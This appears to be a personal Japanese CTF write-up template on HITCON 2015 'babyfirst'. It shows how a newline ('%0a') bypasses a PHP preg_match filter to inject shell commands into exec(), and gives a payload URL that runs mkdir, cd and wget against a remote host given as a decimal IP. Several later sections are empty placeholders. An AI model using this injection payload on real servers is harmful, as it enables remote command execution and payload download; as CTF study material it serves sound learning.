<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [writeup](#writeup)
  - [PHP "preg_match" with "%0a" (hitcon2015 babyfirst)](#php-preg_match-with--hitcon2015-babyfirst)
  - [](#)
  - [](#-1)
  - [](#-2)
  - [](#-3)
  - [](#-4)
- [メモ](#%E3%83%A1%E3%83%A2)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# writeup
## PHP "preg_match" with "%0a" (hitcon2015 babyfirst)
https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst  
https://github.com/pwning/public-writeup/blob/master/hitcon2015/web100-babyfirst/writeup.md  
- **entrypoint**  
以下のソースが与えられる。  
`if ( !preg_match('/^\w+$/', $args[$i]) )`で行頭から行末までが`\w`(abcdefghijklmnopqrstuvwxyz0123456789_)の時に`/bin/orange`コマンドと結合する。  
`preg_match`の`^ $`では改行文字`%0a`を入れると「行頭から改行文字まで」に範囲が変わってしまって、改行文字以降はチェックしなくなる！  
https://qiita.com/tadsan/items/81b2925b3ed03ae6b7e0  

```php
<?php
    highlight_file(__FILE__);

    $dir = 'sandbox/' . $_SERVER['REMOTE_ADDR'];
    if ( !file_exists($dir) )
        mkdir($dir);
    chdir($dir);

    $args = $_GET['args'];
    for ( $i=0; $i<count($args); $i++ ){
        if ( !preg_match('/^\w+$/', $args[$i]) )
            exit();
    }
    exec("/bin/orange " . implode(" ", $args));
?>
```
以下のようにすることで`%0a`以降のコマンドを普通に実行できる。  
配列にしてるのは`$args[$i]`で入力が配列として期待されているから。  
```txt
http://localhost/
?args[0]=x%0a
&args[1]=mkdir
&args[2]=orange%0a
&args[3]=cd
&args[4]=orange%0a
&args[5]=wget
&args[6]=846465263%0a
```
- **payload**  
```txt
http://localhost/
?args[0]=x%0a
&args[1]=mkdir
&args[2]=orange%0a
&args[3]=cd
&args[4]=orange%0a
&args[5]=wget
&args[6]=846465263%0a
```
## 
- **entrypoint**  
- **payload**  
## 
- **entrypoint**  
- **payload**  
## 
- **entrypoint**  
- **payload**  
## 
- **entrypoint**  
- **payload**  
## 
- **entrypoint**  
- **payload**  

# メモ
